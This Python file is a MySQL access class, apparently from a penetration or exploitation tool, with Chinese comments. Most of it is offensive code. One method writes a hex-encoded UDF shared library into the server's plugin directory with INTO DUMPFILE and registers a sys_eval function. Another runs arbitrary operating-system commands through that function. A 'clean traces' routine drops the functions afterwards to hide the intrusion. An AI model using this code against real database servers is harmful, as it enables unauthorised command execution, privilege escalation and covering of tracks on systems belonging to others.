"""
MySQL 数据库操作 DAO
"""
import pymysql
import threading
from typing import Optional, Callable
from core.entities import DatabaseSession


class MysqlDao:
    """MySQL数据库访问对象"""
    
    def __init__(self, session: DatabaseSession):
        """初始化MySQL连接"""
        self.session = session
        self.connection: Optional[pymysql.Connection] = None
        self.version = None
        self.platform = None
        self.system_platform = None
        self.log_callback: Optional[Callable] = None
        
    def set_log_callback(self, callback: Callable):
        """设置日志回调函数"""
        self.log_callback = callback
    
    def log(self, message: str):
        """输出日志"""
        if self.log_callback:
            self.log_callback(message)
    
    def get_connection(self) -> pymysql.Connection:
        """获取数据库连接"""
        if self.connection is None or not self.connection.open:
            try:
                self.connection = pymysql.connect(
                    host=self.session.ip_address,
                    port=int(self.session.port),
                    user=self.session.username,
                    password=self.session.password,
                    database=self.session.database,
                    charset='utf8mb4',
                    connect_timeout=int(self.session.timeout)
                )
                self.log("连接成功!")
            except Exception as e:
                self.log(f"连接失败: {str(e)}")
                raise
        
        return self.connection
    
    def close_connection(self):
        """关闭数据库连接"""
        if self.connection:
            try:
                self.connection.close()
                self.connection = None
                self.log("连接已关闭")
            except Exception as e:
                self.log(f"关闭连接失败: {str(e)}")
    
    def test_connection(self) -> bool:
        """测试数据库连接"""
        try:
            conn = self.get_connection()
            cursor = conn.cursor()
            cursor.execute("SELECT 1")
            cursor.close()
            return True
        except Exception as e:
            self.log(f"测试连接失败: {str(e)}")
            return False
    
    def get_info(self):
        """获取数据库基本信息"""
        try:
            conn = self.get_connection()
            cursor = conn.cursor()
            
            # 获取版本信息
            cursor.execute("SELECT VERSION() as version")
            result = cursor.fetchone()
            if result:
                self.version = result[0]
                self.log(f"MySQL版本: {self.version}")
            
            # 获取系统信息
            cursor.execute("SELECT @@version_compile_os as platform")
            result = cursor.fetchone()
            if result:
                self.platform = result[0]
                self.log(f"系统平台: {self.platform}")
            
            # 获取位数信息
            cursor.execute("SELECT @@version_compile_machine as machine")
            result = cursor.fetchone()
            if result:
                self.system_platform = result[0]
                self.log(f"系统位数: {self.system_platform}")
            
            cursor.close()
            
        except Exception as e:
            self.log(f"获取信息失败: {str(e)}")
    
    def execute_command(self, command: str, encoding: str = 'utf-8') -> str:
        """执行系统命令（通过UDF函数）"""
        try:
            conn = self.get_connection()
            cursor = conn.cursor()
            
            # 使用 sys_eval UDF函数执行命令
            sql = f"SELECT sys_eval('{command}') as result"
            cursor.execute(sql)
            result = cursor.fetchone()
            
            cursor.close()
            
            if result and result[0]:
                return result[0]
            else:
                return "命令执行完成（无输出）"
                
        except pymysql.Error as e:
            if "does not exist" in str(e):
                return "错误: sys_eval 函数不存在，请先进行 UDF 提权"
            else:
                return f"执行失败: {str(e)}"
        except Exception as e:
            return f"执行失败: {str(e)}"
    
    def udf_privilege_escalation(self) -> bool:
        """UDF提权"""
        try:
            self.log("开始 UDF 提权...")
            conn = self.get_connection()
            cursor = conn.cursor()
            cursor.execute("SHOW VARIABLES LIKE 'plugin_dir'")
            result = cursor.fetchone()
            if not result:
                self.log("无法获取 plugin_dir")
                return False
            plugin_dir = result[1]
            self.log(f"Plugin 目录: {plugin_dir}")

            # 自动选择UDF文件
            platform = (self.platform or '').lower()
            system_platform = (self.system_platform or '').lower()
            udf_dir = r'database/plugins/Mysql'
            import os
            udf_file = None
            if 'win' in platform:
                if '64' in system_platform:
                    udf_file = os.path.join(udf_dir, 'udf_win64_hex.txt')
                else:
                    udf_file = os.path.join(udf_dir, 'udf_win32_hex.txt')
            elif 'linux' in platform:
                if '64' in system_platform:
                    udf_file = os.path.join(udf_dir, 'udf_linux64_hex.txt')
                else:
                    udf_file = os.path.join(udf_dir, 'udf_linux32_hex.txt')
            else:
                self.log(f"不支持的平台: {platform}")
                cursor.close()
                return False

            # 读取UDF文件内容
            try:
                with open(udf_file, 'r') as f:
                    udf_hex = f.read().strip()
                if not udf_hex.startswith('0x'):
                    self.log("UDF文件格式错误")
                    cursor.close()
                    return False
            except Exception as e:
                self.log(f"读取UDF文件失败: {str(e)}")
                cursor.close()
                return False

            # 拼接目标路径
            if platform.startswith('win'):
                target_path = os.path.join(plugin_dir, 'lib_mysqldudf_sys.dll')
            else:
                target_path = os.path.join(plugin_dir, 'lib_mysqldudf_sys.so')

            self.log(f"准备写入UDF库到: {target_path}")

            # 写入UDF库文件
            try:
                sql = f"SELECT CAST({udf_hex} AS BINARY) INTO DUMPFILE '{target_path.replace('\\', '/')}'"
                cursor.execute(sql)
                self.log("UDF库文件写入成功")
            except Exception as e:
                self.log(f"写入UDF库失败: {str(e)}")
                cursor.close()
                return False

            # 创建UDF函数
            try:
                cursor.execute("CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqldudf_sys.dll'" if platform.startswith('win') else "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqldudf_sys.so'")
                self.log("UDF函数 sys_eval 创建成功")
            except Exception as e:
                self.log(f"创建UDF函数失败: {str(e)}")
                cursor.close()
                return False

            cursor.close()
            self.log("UDF提权完成！")
            return True
        except Exception as e:
            self.log(f"UDF 提权失败: {str(e)}")
            return False
    
    def clean_traces(self):
        """清理痕迹"""
        try:
            self.log("开始清理痕迹...")
            
            conn = self.get_connection()
            cursor = conn.cursor()
            
            # 删除自定义函数
            try:
                cursor.execute("DROP FUNCTION IF EXISTS sys_eval")
                self.log("已删除 sys_eval 函数")
            except:
                pass
            
            try:
                cursor.execute("DROP FUNCTION IF EXISTS sys_exec")
                self.log("已删除 sys_exec 函数")
            except:
                pass
            
            cursor.close()
            self.log("痕迹清理完成")
            
        except Exception as e:
            self.log(f"清理痕迹失败: {str(e)}")
    
    def execute_sql(self, sql: str) -> tuple:
        """执行SQL语句"""
        try:
            conn = self.get_connection()
            cursor = conn.cursor()
            cursor.execute(sql)
            
            # 如果是查询语句，返回结果
            if sql.strip().upper().startswith('SELECT'):
                results = cursor.fetchall()
                columns = [desc[0] for desc in cursor.description] if cursor.description else []
                cursor.close()
                return (True, results, columns)
            else:
                conn.commit()
                cursor.close()
                return (True, f"影响行数: {cursor.rowcount}", [])
                
        except Exception as e:
            return (False, str(e), [])
